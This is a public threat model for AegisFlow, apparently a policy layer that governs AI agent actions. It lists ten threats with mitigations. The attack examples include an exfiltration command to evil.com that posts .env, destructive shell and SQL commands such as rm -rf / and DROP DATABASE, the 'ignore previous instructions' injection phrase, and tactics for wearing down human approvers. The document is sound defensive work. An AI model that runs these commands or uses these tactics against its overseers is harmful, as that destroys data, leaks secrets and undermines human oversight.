# AegisFlow Threat Model

**Version:** 1.0
**Date:** 2026-04-06
**Status:** Public

---

## Scope

AegisFlow governs agent execution at the protocol boundary. It intercepts, evaluates, and controls every action an AI agent attempts across five protocol types: MCP, HTTP, shell, SQL, and Git. AegisFlow does not modify agent internals or model weights. It operates as a transparent enforcement layer between agents and the tools they use.

### In scope

- All agent actions normalized into `ActionEnvelope` objects
- Policy evaluation (allow / review / block) for every action
- Credential issuance and lifecycle
- Evidence chain integrity
- Approval workflows
- Admin and operator control plane
- Policy packs and WASM plugin extensions

### Out of scope

- Model training and fine-tuning
- Prompt engineering within the agent itself
- End-user authentication to upstream services (AegisFlow governs agent access, not human access)

---

## Trust Boundaries

### Agent <-> AegisFlow (UNTRUSTED)

The agent is treated as an untrusted principal. It may be compromised, manipulated via prompt injection, or operating outside its declared intent. Every action from the agent passes through the policy engine before execution.

### AegisFlow <-> Upstream Tools (SEMI-TRUSTED)

AegisFlow proxies requests to upstream services (GitHub API, databases, shell, HTTP endpoints) using task-scoped, short-lived credentials. AegisFlow controls what the agent can request, but upstream services enforce their own authorization. AegisFlow does not trust upstream services to enforce agent-level policy.

### Operator <-> AegisFlow Control Plane (TRUSTED)

Operators interact with AegisFlow through the admin API (port 8081), `aegisctl` CLI, and GraphQL. Access is authenticated via API keys and enforced through RBAC (admin, operator, viewer roles). All admin actions are audited.

### Policy Packs / WASM Plugins <-> AegisFlow (CONDITIONALLY TRUSTED)

Extensions run within AegisFlow's process. WASM plugins execute in a sandboxed runtime (wazero). Policy packs are loaded at startup. In strict mode, unsigned extensions are rejected.

---

## Threat Categories

### T1: Prompt Injection / Tool Misuse

**Description:** An attacker manipulates the agent through prompt injection to call unintended tools, access unauthorized resources, or bypass safety instructions.

**Attack examples:**
- Injecting "ignore previous instructions" into user input
- Embedding tool-calling instructions in retrieved documents
- Crafting inputs that cause the agent to call destructive tools

**AegisFlow mitigations:**
- Input policy engine with keyword blocklist, regex patterns, and PII detection
- Tool allowlist/denylist per policy pack (e.g., `coding-agent-strict` blocks all delete operations)
- TaskManifest drift detection catches tool usage outside declared scope
- Fail-closed governance mode blocks actions when policy evaluation errors

**Residual risk:** Novel prompt injection techniques that do not match keyword or regex patterns. Mitigated by behavioral detection and review paths for sensitive operations.

---

### T2: Credential Theft / Exfiltration

**Description:** A compromised agent reads secrets (environment variables, .env files, /etc/shadow) and attempts to exfiltrate them to an external host.

**Attack examples:**
- `cat .env` followed by `curl -X POST https://evil.com/exfil -d @.env`
- `printenv` to dump all environment variables
- Reading cloud credential files and sending them over HTTP

**AegisFlow mitigations:**
- Shell sandbox with environment variable redaction
- Behavioral detection engine identifies exfiltration patterns (read secret + outbound HTTP)
- Network egress policy restricts outbound connections
- Tool policy blocks access to sensitive file paths (.env, /etc/shadow, credential files)
- Attack demo validates 20+ exfiltration scenarios are blocked

**Residual risk:** Exfiltration through side channels not covered by network policy (e.g., DNS tunneling). Mitigated by monitoring and network-level controls outside AegisFlow.

---

### T3: Privilege Escalation

**Description:** An agent modifies CI/CD pipeline configuration, workflow files, or infrastructure definitions to gain elevated permissions on subsequent runs.

**Attack examples:**
- Editing `.github/workflows/*.yaml` to add `permissions: write-all`
- Modifying Terraform files to create admin IAM roles
- Pushing to protected branches to trigger privileged automation

**AegisFlow mitigations:**
- Git sandbox with workflow file protection (special handling for `.github/workflows/`)
- Path-based policies block writes to sensitive directories
- Behavioral detection identifies escalation patterns (inspect CI, edit workflow, push, trigger)
- Force push is blocked by default in all policy packs
- Branch protection awareness prevents writes to protected branches

**Residual risk:** Escalation through indirect paths (e.g., modifying a build script that is later executed with elevated permissions). Mitigated by TaskManifest scope constraints and review paths for write operations.

---

### T4: Destructive Actions

**Description:** An agent executes destructive commands that cause data loss or service disruption.

**Attack examples:**
- `DROP TABLE users` / `DROP DATABASE production`
- `rm -rf /` / `dd if=/dev/zero of=/dev/sda`
- `git push --force` to overwrite history
- `TRUNCATE TABLE audit_log` to destroy evidence
- `DELETE FROM users` without WHERE clause

**AegisFlow mitigations:**
- SQL sandbox blocks DDL statements (DROP, TRUNCATE, ALTER) and unbounded DELETE
- Shell dangerous command detection blocks `rm -rf`, `dd`, `shutdown`, `chmod 777`
- Tool policy blocks delete capability across all protocols
- All three policy packs (strict, readonly, permissive) block destructive operations
- Attack demo validates 20+ destructive scenarios

**Residual risk:** Destructive actions disguised through obfuscation (e.g., base64-encoded commands). Mitigated by shell sandbox binary allowlists and behavioral analysis.

---

### T5: Scope Creep / Intent Drift

**Description:** An agent exceeds the boundaries of its declared task, accessing resources or performing operations outside the expected scope.

**Attack examples:**
- Task declares "edit docs, run tests, open PR" but agent accesses production database
- Agent modifies files outside the declared repository
- Agent accumulates actions far beyond the expected count

**AegisFlow mitigations:**
- TaskManifest declares expected tools, resources, write domains, and max action count
- Drift detection compares actual execution against the manifest in real time
- Session risk score accumulates as actions deviate from declared scope
- Kill switch triggers when risk score exceeds threshold
- Shadow mode available for gradual rollout of drift enforcement

**Residual risk:** Manifest declarations that are too broad. Mitigated by policy simulation tools (`aegisctl simulate`) and operator review of manifest scope.

---

### T6: Replay Attacks

**Description:** An attacker captures a previously approved action and replays it to execute without fresh authorization.

**Attack examples:**
- Replaying an approved credential issuance request
- Reusing an expired approval token
- Submitting a duplicate action with the same ID

**AegisFlow mitigations:**
- Capability tickets include nonce and TTL for replay protection
- Evidence chain ordering detects duplicate or out-of-order actions
- Credential issuance is bound to specific action ID and session
- Short-lived credentials expire after task completion

**Residual risk:** Replay within the TTL window. Mitigated by short TTLs and action-specific binding.

---

### T7: Evidence Tampering

**Description:** An attacker or compromised component modifies audit records to cover their tracks or fabricate a compliance story.

**Attack examples:**
- Deleting audit entries for blocked actions
- Modifying a "block" decision to "allow" in the evidence chain
- Inserting fabricated approval records

**AegisFlow mitigations:**
- SHA-256 hash chain with append-only writes
- Each record includes the hash of the previous record, creating a tamper-evident chain
- `aegisctl evidence verify` CLI detects any modification to the chain
- Session manifests with ordered action records
- Evidence export bundles include integrity metadata

**Residual risk:** Compromise of the storage backend itself. Mitigated by exporting evidence to external SIEM/data warehouse and separation of duties (evidence storage admin != session operator).

---

### T8: Supply Chain Compromise

**Description:** A malicious policy pack or WASM plugin is loaded into AegisFlow, subverting the governance layer.

**Attack examples:**
- A policy pack that silently allows all destructive actions
- A WASM plugin that exfiltrates action data
- A modified connector binary that bypasses policy evaluation

**AegisFlow mitigations:**
- Signed policy packs with signature verification at load time
- Trust tiers for connectors and plugins (verified, community, untrusted)
- Strict mode rejects unsigned or unverified extensions
- WASM plugins run in sandboxed runtime (wazero) with limited host access
- Plugin provenance metadata tracked in evidence

**Residual risk:** Compromise of the signing key. Mitigated by key rotation procedures and separation of signing authority from deployment authority.

---

### T9: Approval Fatigue

**Description:** High volumes of review requests cause operators to rubber-stamp approvals without proper evaluation.

**Attack examples:**
- An agent generating many low-risk review requests to condition the operator, then slipping in a high-risk action
- Repeated escalations that train operators to click "approve" reflexively

**AegisFlow mitigations:**
- Behavioral analysis detects repeated escalation patterns
- Risk scoring surfaces high-risk actions prominently
- Kill switch auto-blocks sessions that generate excessive review requests
- Approval scope controls ("approve once for this task scope" vs. "approve only this exact action")
- Approval expiry prevents stale approvals from being used

**Residual risk:** Operators who deliberately bypass review. Mitigated by separation of duties (approver != requester) and all approvals recorded in evidence chain.

---

### T10: Control Plane Compromise

**Description:** An attacker gains access to the AegisFlow admin API or control plane, allowing them to modify policies, approve actions, or disable governance.

**Attack examples:**
- Stolen admin API key used to disable policy enforcement
- Unauthorized access to the approval queue to approve malicious actions
- Modifying RBAC roles to grant attacker admin access

**AegisFlow mitigations:**
- RBAC with three-role hierarchy (admin, operator, viewer)
- Separation of duties (policy author != approver, connector admin != session operator)
- All admin API changes are audited in the evidence chain
- Admin API runs on a separate port (8081) for network segmentation
- API key authentication with per-key role assignment
- Break-glass use is always audited with postmortem requirement

**Residual risk:** Insider threat with legitimate admin access. Mitigated by audit trail, separation of duties, and external monitoring integration.

---

## Risk Summary Matrix

| Threat | Likelihood | Impact | AegisFlow Controls | Residual Risk |
|--------|-----------|--------|--------------------|----|
| T1: Prompt Injection | High | High | Input policy, tool allowlist, drift detection | Medium |
| T2: Credential Theft | High | Critical | Shell sandbox, behavioral detection, network policy | Low |
| T3: Privilege Escalation | Medium | Critical | Git sandbox, path policies, behavioral detection | Low |
| T4: Destructive Actions | Medium | Critical | SQL sandbox, dangerous command detection, tool policy | Low |
| T5: Scope Creep | High | Medium | TaskManifest, drift detection, kill switch | Medium |
| T6: Replay Attacks | Low | Medium | Capability tickets, nonce, TTL | Low |
| T7: Evidence Tampering | Low | High | SHA-256 hash chain, verification CLI | Low |
| T8: Supply Chain | Low | Critical | Signed bundles, trust tiers, strict mode | Low |
| T9: Approval Fatigue | Medium | High | Behavioral analysis, risk scoring, kill switch | Medium |
| T10: Control Plane | Low | Critical | RBAC, separation of duties, audit trail | Low |

---

## Review Schedule

This threat model is reviewed and updated:
- Quarterly, as part of the AegisFlow security review cycle
- When new protocol types or connectors are added
- When significant architectural changes are made
- After any security incident
